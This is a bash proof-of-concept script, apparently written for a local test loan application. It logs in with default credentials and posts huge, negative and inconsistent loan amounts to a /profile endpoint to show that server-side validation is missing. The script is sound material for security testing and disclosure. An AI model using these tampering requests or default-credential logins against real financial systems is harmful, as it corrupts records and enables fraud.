#!/bin/bash

# POC: Arbitrary Loan Amount Modification in /profile Endpoint
# This demonstrates lack of input validation on loan parameters

TARGET="http://localhost:8080"

echo "[*] Testing arbitrary loan amount modification vulnerability"
echo "[*] Target: $TARGET/profile"
echo ""

# First, login with default credentials to get authenticated session
echo "[+] Step 1: Authenticating with default credentials (test:test)..."
RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "$TARGET/login" \
  -d "username=test&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded")

echo "[+] Authentication completed"
echo ""

# Test 1: Modify loan amount to extremely high value (999999)
echo "[+] Step 2: Attempting to set loan_amount to 999999..."
curl -s -b /tmp/cookies.txt -X POST "$TARGET/profile" \
  -d "loan_amount=999999&monthly_payment=999999" \
  -H "Content-Type: application/x-www-form-urlencoded" > /dev/null

echo "[+] Sent POST request with loan_amount=999999"
echo ""

# Verify the modification persisted
echo "[+] Step 3: Verifying modification persisted..."
PROFILE_DATA=$(curl -s -b /tmp/cookies.txt "$TARGET/profile")

if echo "$PROFILE_DATA" | grep -q "999999"; then
    echo "[SUCCESS] Vulnerability confirmed! loan_amount=999999 was accepted and stored without validation"
    echo "[*] Profile data contains: $(echo "$PROFILE_DATA" | grep -o 'value=\"999999[^\"]*\"' | head -1)"
else
    echo "[-] Could not verify loan amount in profile"
fi

echo ""

# Test 2: Test with negative loan amount
echo "[+] Step 4: Testing with negative loan amount..."
curl -s -b /tmp/cookies.txt -X POST "$TARGET/profile" \
  -d "loan_amount=-5000&monthly_payment=-1000" \
  -H "Content-Type: application/x-www-form-urlencoded" > /dev/null

PROFILE_DATA=$(curl -s -b /tmp/cookies.txt "$TARGET/profile")
if echo "$PROFILE_DATA" | grep -q "\-5000"; then
    echo "[SUCCESS] Negative loan amounts accepted without validation!"
else
    echo "[INFO] Negative values may have been rejected"
fi

echo ""

# Test 3: Test with inconsistent values (monthly payment > principal)
echo "[+] Step 5: Testing with inconsistent loan data (monthly_payment > principal)..."
curl -s -b /tmp/cookies.txt -X POST "$TARGET/profile" \
  -d "loan_amount=1000&monthly_payment=5000&loan_term_months=1" \
  -H "Content-Type: application/x-www-form-urlencoded" > /dev/null

PROFILE_DATA=$(curl -s -b /tmp/cookies.txt "$TARGET/profile")
echo "[+] Sent: loan_amount=1000, monthly_payment=5000, term=1 month"

if echo "$PROFILE_DATA" | grep -q "5000"; then
    echo "[SUCCESS] Application accepted monthly_payment > principal without validation!"
    echo "[*] This creates mathematically inconsistent loan data"
fi

echo ""
echo "[*] POC Complete: Arbitrary loan amount modification vulnerability demonstrated"
echo "[*] The /profile endpoint accepts any loan values without validation"